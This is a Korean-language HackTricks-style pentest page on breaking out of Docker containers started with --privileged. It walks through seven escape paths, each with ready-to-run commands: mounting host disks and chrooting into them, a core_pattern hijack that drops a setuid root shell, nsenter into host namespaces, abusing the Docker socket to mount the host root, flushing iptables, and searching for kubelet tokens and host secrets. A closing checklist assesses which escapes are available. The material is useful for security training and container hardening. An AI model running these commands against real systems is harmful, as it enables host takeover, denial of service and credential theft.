# `--privileged` Container에서 탈출하기

{{#include ../../../banners/hacktricks-training.md}}

## 개요

`--privileged`로 시작된 container는 권한이 한두 개 더 추가된 일반 container와는 다릅니다. 실제로 `--privileged`는 일반적으로 workload가 위험한 host 리소스에 접근하지 못하도록 보호하는 여러 기본 runtime 보호 기능을 제거하거나 약화합니다. 정확한 효과는 runtime과 host에 따라 달라지지만, Docker에서 일반적으로 나타나는 결과는 다음과 같습니다.

- 모든 capability가 부여됨
- device cgroup 제한이 해제됨
- 여러 kernel filesystem이 더 이상 read-only로 mount되지 않음
- 기본적으로 masked 처리된 procfs 경로가 사라짐
- seccomp filtering이 비활성화됨
- AppArmor confinement가 비활성화됨
- SELinux isolation이 비활성화되거나 훨씬 광범위한 label로 대체됨

중요한 점은 privileged container가 일반적으로 미묘한 kernel exploit을 **필요로 하지 않는다**는 것입니다. 많은 경우 host device, host에 연결된 kernel filesystem 또는 runtime interface와 직접 상호작용한 다음 host shell로 pivot할 수 있습니다.

## `--privileged`가 자동으로 변경하지 않는 것

`--privileged`는 host PID, network, IPC 또는 UTS namespace에 **자동으로 join하지 않습니다**. privileged container에도 여전히 private namespace가 존재할 수 있습니다. 따라서 일부 escape chain에는 다음과 같은 추가 조건이 필요합니다.

- host bind mount
- host PID sharing
- host networking
- 노출된 host device
- writable proc/sys interface

이러한 조건은 실제 misconfiguration 환경에서 충족하기 쉬운 경우가 많지만, 개념적으로는 `--privileged` 자체와는 별개의 요소입니다.

## Escape 경로

### 1. 노출된 Device를 통해 Host Disk Mount하기

privileged container에서는 일반적으로 `/dev` 아래에 훨씬 더 많은 device node가 보입니다. host block device가 보이는 경우 가장 간단한 escape 방법은 이를 mount한 다음 host filesystem으로 `chroot`하는 것입니다.
```bash
ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null
mkdir -p /mnt/hostdisk
mount /dev/sda1 /mnt/hostdisk 2>/dev/null || mount /dev/vda1 /mnt/hostdisk 2>/dev/null
ls -la /mnt/hostdisk
chroot /mnt/hostdisk /bin/bash 2>/dev/null
```
root 파티션이 명확하지 않다면 먼저 block layout을 열거합니다:
```bash
fdisk -l 2>/dev/null
blkid 2>/dev/null
debugfs /dev/sda1 2>/dev/null
```
실용적인 방법이 `chroot` 대신 쓰기 가능한 호스트 마운트에 setuid helper를 심는 것이라면, 모든 파일시스템이 setuid 비트를 적용하는 것은 아니라는 점을 기억하세요. 호스트 측에서 다음과 같이 지원 여부를 빠르게 확인할 수 있습니다:
```bash
mount | grep -v "nosuid"
```
이는 `nosuid` 파일시스템 아래의 쓰기 가능한 경로가 고전적인 "setuid 셸을 드롭한 후 나중에 실행" 워크플로에서 훨씬 덜 흥미롭기 때문에 유용합니다.

여기서 악용되는 약화된 보호 기능은 다음과 같습니다.

- 전체 device 노출
- 광범위한 capabilities, 특히 `CAP_SYS_ADMIN`

관련 페이지:

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

### 2. Host Bind Mount를 마운트하거나 재사용한 후 `chroot`

host root filesystem이 이미 container 내부에 마운트되어 있거나, container가 privileged 상태이므로 필요한 mount를 생성할 수 있다면 host 셸은 `chroot` 한 번만으로 얻을 수 있는 경우가 많습니다:
```bash
mount | grep -E ' /host| /mnt| /rootfs'
ls -la /host 2>/dev/null
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
host root bind mount가 존재하지 않지만 host storage에 접근할 수 있다면 하나를 생성합니다:
```bash
mkdir -p /tmp/host
mount --bind / /tmp/host
chroot /tmp/host /bin/bash 2>/dev/null
```
이 경로는 다음을 악용합니다:

- 완화된 mount 제한
- 전체 capabilities
- MAC confinement 부재

관련 페이지:

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/apparmor.md
{{#endref}}

{{#ref}}
protections/selinux.md
{{#endref}}

### 3. Writable `/proc/sys` 또는 `/sys` 악용

`--privileged`의 주요 결과 중 하나는 procfs 및 sysfs 보호가 훨씬 약해진다는 것입니다. 이로 인해 일반적으로 마스킹되거나 read-only로 mount되는 host 대상 kernel 인터페이스가 노출될 수 있습니다.

대표적인 예는 `core_pattern`입니다:
```bash
[ -w /proc/sys/kernel/core_pattern ] || exit 1
overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /shell.sh
#!/bin/sh
cp /bin/sh /tmp/rootsh
chmod u+s /tmp/rootsh
EOF
chmod +x /shell.sh
echo "|$overlay/shell.sh" > /proc/sys/kernel/core_pattern
cat <<'EOF' > /tmp/crash.c
int main(void) {
char buf[1];
for (int i = 0; i < 100; i++) buf[i] = 1;
return 0;
}
EOF
gcc /tmp/crash.c -o /tmp/crash
/tmp/crash
ls -l /tmp/rootsh
```
기타 high-value paths에는 다음이 포함됩니다:
```bash
cat /proc/sys/kernel/modprobe 2>/dev/null
cat /proc/sys/fs/binfmt_misc/status 2>/dev/null
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
```
이 경로는 다음을 악용합니다:

- 누락된 masked paths
- 누락된 read-only system paths

관련 페이지:

{{#ref}}
protections/masked-paths.md
{{#endref}}

{{#ref}}
protections/read-only-paths.md
{{#endref}}

### 4. Mount 또는 Namespace 기반 탈출에 전체 Capabilities 사용

Privileged container는 일반적으로 standard container에서 제거되는 capabilities를 제공받으며, 여기에는 `CAP_SYS_ADMIN`, `CAP_SYS_PTRACE`, `CAP_SYS_MODULE`, `CAP_NET_ADMIN` 등이 포함됩니다. 다른 노출된 surface가 존재한다면, 이것만으로도 local foothold를 host escape로 전환하기에 충분한 경우가 많습니다.

간단한 예로, 추가 filesystem을 mount하고 namespace 진입을 사용할 수 있습니다:
```bash
capsh --print | grep cap_sys_admin
which nsenter
nsenter -t 1 -m -u -n -i -p sh 2>/dev/null || echo "host namespace entry blocked"
```
호스트 PID도 공유된다면, 단계는 더욱 짧아집니다:
```bash
ps -ef | head -n 50
nsenter -t 1 -m -u -n -i -p /bin/bash
```
이 경로는 다음을 악용합니다:

- 기본 privileged capability set
- 선택적 host PID sharing

관련 페이지:

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/namespaces/pid-namespace.md
{{#endref}}

### 5. Runtime Sockets를 통한 Escape

privileged container에는 host runtime state 또는 socket이 노출되는 경우가 많습니다. Docker, containerd 또는 CRI-O socket에 접근할 수 있다면, 가장 간단한 방법은 runtime API를 사용해 host access 권한이 있는 두 번째 container를 실행하는 것입니다:
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock \) 2>/dev/null
docker -H unix:///var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
containerd의 경우:
```bash
ctr --address /run/containerd/containerd.sock images ls 2>/dev/null
```
이 경로는 다음을 악용합니다:

- privileged runtime 노출
- runtime 자체를 통해 생성된 호스트 bind mount

관련 페이지:

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
runtime-api-and-daemon-exposure.md
{{#endref}}

### 6. Network Isolation의 부작용 제거

`--privileged`만으로는 호스트 network namespace에 참여하지 않지만, 컨테이너에 `--network=host` 또는 다른 호스트 network access가 함께 설정된 경우 전체 network stack을 변경할 수 있습니다:
```bash
capsh --print | grep cap_net_admin
ip addr
ip route
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link set lo down 2>/dev/null
iptables -F 2>/dev/null
```
항상 직접적인 host shell을 제공하는 것은 아니지만, denial of service, traffic interception 또는 loopback 전용 management services에 대한 access로 이어질 수 있습니다.

Related pages:

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/namespaces/network-namespace.md
{{#endref}}

### 7. Host Secrets 및 Runtime State 읽기

clean한 shell escape가 즉시 가능하지 않더라도, privileged containers는 host secrets, kubelet state, runtime metadata 및 인접한 container filesystems를 읽을 수 있을 만큼 충분한 access를 보유하는 경우가 많습니다:
```bash
find /var/lib /run /var/run -maxdepth 3 -type f 2>/dev/null | head -n 100
find /var/lib/kubelet -type f -name token 2>/dev/null | head -n 20
find /var/lib/containerd -type f 2>/dev/null | head -n 50
```
`/var`가 host-mounted되어 있거나 runtime 디렉터리가 노출되어 있다면, host shell을 획득하기 전에도 lateral movement 또는 cloud/Kubernetes credential theft에 충분할 수 있습니다.

관련 페이지:

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
sensitive-host-mounts.md
{{#endref}}

## 점검

다음 명령의 목적은 어떤 privileged-container escape 계열이 즉시 실행 가능한지 확인하는 것입니다.
```bash
capsh --print                                    # Confirm the expanded capability set
mount | grep -E '/proc|/sys| /host| /mnt'        # Check for dangerous kernel filesystems and host binds
ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null   # Check for host block devices
grep Seccomp /proc/self/status                   # Confirm seccomp is disabled
cat /proc/self/attr/current 2>/dev/null          # Check whether AppArmor/SELinux confinement is gone
find / -maxdepth 3 -name '*.sock' 2>/dev/null    # Look for runtime sockets
```
여기서 흥미로운 점:

- 전체 capability set, 특히 `CAP_SYS_ADMIN`
- writable proc/sys 노출
- 표시되는 host devices
- seccomp 및 MAC confinement 부재
- runtime sockets 또는 host root bind mounts

이 중 하나만으로도 post-exploitation에 충분할 수 있습니다. 여러 항목이 함께 있으면 일반적으로 컨테이너가 host compromise까지 사실상 한두 개의 명령만 남은 상태라는 의미입니다.

## 관련 페이지

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/seccomp.md
{{#endref}}

{{#ref}}
protections/apparmor.md
{{#endref}}

{{#ref}}
protections/selinux.md
{{#endref}}

{{#ref}}
protections/masked-paths.md
{{#endref}}

{{#ref}}
protections/read-only-paths.md
{{#endref}}

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
protections/namespaces/pid-namespace.md
{{#endref}}

{{#ref}}
protections/namespaces/network-namespace.md
{{#endref}}
{{#include ../../../banners/hacktricks-training.md}}
